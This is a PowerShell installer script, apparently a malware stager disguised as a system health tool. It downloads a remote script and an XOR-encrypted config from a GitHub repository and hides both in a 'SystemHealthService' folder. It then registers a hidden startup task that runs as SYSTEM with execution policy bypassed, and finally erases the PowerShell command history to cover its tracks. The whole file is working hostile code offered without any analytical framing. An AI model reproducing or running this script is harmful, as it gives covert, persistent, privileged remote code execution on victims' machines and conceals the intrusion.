# Direct URLs
$agentUrl  = "https://raw.githubusercontent.com/saiyanjohan580-boop/autocleaner/refs/heads/main/HealthMonitor.ps1"
$configUrl = "https://raw.githubusercontent.com/saiyanjohan580-boop/autocleaner/refs/heads/main/config.enc"
# Decryption key (same as encryption)
$key = "S3cr3tK3y2024!"
# Hidden folder
$basePath = "$env:APPDATA\SystemHealthService"
New-Item -ItemType Directory -Force -Path $basePath | Out-Null
(Get-Item $basePath).Attributes = "Hidden"
# Download agent
(New-Object Net.WebClient).DownloadFile($agentUrl, "$basePath\HealthMonitor.ps1")
(Get-Item "$basePath\HealthMonitor.ps1").Attributes = "Hidden"
# Download and decrypt config
$encryptedBase64 = (New-Object Net.WebClient).DownloadString($configUrl)
$encrypted = [Convert]::FromBase64String($encryptedBase64)
$keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)
$decrypted = @()
for ($i = 0; $i -lt $encrypted.Length; $i++) {
    $decrypted += $encrypted[$i] -bxor $keyBytes[$i % $keyBytes.Length]
}
$config = [System.Text.Encoding]::UTF8.GetString($decrypted)
$config | Out-File "$basePath\config.json"
(Get-Item "$basePath\config.json").Attributes = "Hidden"
# Scheduled task
Register-ScheduledTask -TaskName "SystemHealthMonitor" `
    -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$basePath\HealthMonitor.ps1`"") `
    -Trigger (New-ScheduledTaskTrigger -AtStartup) `
    -Principal (New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest) `
    -Settings (New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable) `
    -Force
Start-ScheduledTask -TaskName "SystemHealthMonitor"
Clear-History; Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
exit